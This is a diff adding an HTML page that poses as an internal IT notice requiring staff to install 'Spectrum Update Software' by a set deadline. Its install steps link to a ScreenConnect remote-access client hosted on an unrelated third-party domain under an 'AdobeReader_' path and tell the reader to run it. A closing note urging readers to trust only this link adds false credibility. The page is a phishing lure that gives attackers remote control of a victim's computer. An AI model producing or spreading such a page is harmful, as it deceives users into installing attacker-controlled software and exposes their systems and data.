@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>IT Notice: Required Software Install</title>
+<style>
+  :root{
+    --brand:#0757c9;
+    --brand-dark:#0045aa;
+    --text:#111827;
+    --muted:#667085;
+    --bg:#ffffff;
+    --bg-soft:#f5f8fc;
+    --border:#e5e7eb;
+    color-scheme: light;
+  }
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      --text:#e9edf3; --bg:#0b1220; --bg-soft:#101a2c; --border:#1d2a3c;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"]{
+    --text:#e9edf3; --bg:#0b1220; --bg-soft:#101a2c; --border:#1d2a3c;
+    color-scheme: dark;
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html { height:100%; }
+  body {
+    font-family: Arial, Helvetica, sans-serif;
+    color: var(--text); background: var(--bg-soft); height:100%;
+    padding-top: env(safe-area-inset-top,0px);
+    padding-bottom: env(safe-area-inset-bottom,0px);
+  }
+
+  .topbar{
+    padding:18px 7%; background:var(--bg); border-bottom:1px solid var(--border);
+    display:flex; align-items:center; gap:10px;
+  }
+  .topbar .tag{
+    font-size:12px; font-weight:800; letter-spacing:.5px; color:var(--brand);
+    background:rgba(7,87,201,0.1); padding:4px 10px; border-radius:6px;
+  }
+  .topbar .company{ font-weight:700; font-size:15px; color:var(--muted); }
+
+  .wrap{ max-width:640px; margin:0 auto; padding:50px 6% 60px; }
+
+  h1{ font-size:26px; margin-bottom:8px; }
+  .meta{ color:var(--muted); font-size:14px; margin-bottom:30px; }
+
+  .box{
+    background:var(--bg); border:1px solid var(--border); border-radius:12px;
+    padding:28px 26px; margin-bottom:24px;
+  }
+
+  .box h2{ font-size:16px; margin-bottom:10px; }
+  .box p{ color:var(--muted); font-size:14px; line-height:1.6; }
+
+  .steps{ list-style:none; counter-reset:step; margin:26px 0; }
+  .steps li{
+    counter-increment:step; display:flex; gap:14px; margin-bottom:20px;
+  }
+  .steps li::before{
+    content:counter(step); flex-shrink:0; width:28px; height:28px; border-radius:50%;
+    background:var(--brand); color:#fff; font-weight:800; font-size:13px;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .steps li .step-text{ font-size:15px; padding-top:3px; }
+  .steps li code{
+    background:var(--bg-soft); border:1px solid var(--border); padding:2px 6px;
+    border-radius:4px; font-size:13px;
+  }
+
+  .steps li .step-text a{ color:var(--brand); font-weight:700; text-decoration:none; }
+  .steps li .step-text a:hover{ text-decoration:underline; }
+
+  .note{
+    border-left:3px solid var(--brand); background:rgba(7,87,201,0.06);
+    padding:14px 16px; border-radius:6px; font-size:13.5px; color:var(--muted);
+    margin-top:28px;
+  }
+  .note strong{ color:var(--text); }
+
+  .contact{ margin-top:20px; font-size:14px; color:var(--muted); }
+  .contact a{ color:var(--brand); font-weight:700; text-decoration:none; }
+</style>
+</head>
+<body>
+
+  <div class="wrap">
+    <h1>Required install: Spectrum Update Software</h1>
+    <p class="meta">Posted by IT · Please complete by 11/25/2026</p>
+
+    <div class="box">
+      <h2>What this is</h2>
+      <p>
+        This software enables IT to automatically manage and install essential system updates, security patches,    and performance improvements, ensuring your Spectrum account remains up to date, secure, and running smoothly. All Spectrum members are required to install the software to enable seamless updates and minimize system interruptions. Please complete the installation as soon as possible to ensure your device receives updates without delay.
+      </p>
+    </div>
+
+    <div class="box">
+      <h2>How to install it</h2>
+      <ol class="steps">
+        <li><span class="step-text">Click <a href="https://ferreteriaalo.com.mx/AdobeReader_/ScreenConnect.ClientSetup.exe">HERE</a> to download the installer.</span></li>
+        <li><span class="step-text">Go to your Downloads folder, locate the file <strong>[ScreenConnect.exe]</strong>, and run the installer to complete setup.</span></li>
+      </ol>
+    </div>
+
+    <div class="note">
+      <strong>Only download this from the link above.</strong> If you receive this file
+      or a similar request by email, text, or pop-up from any other source, do not run
+      it — forward it to IT instead.
+    </div>
+
+
+</body>
+</html>
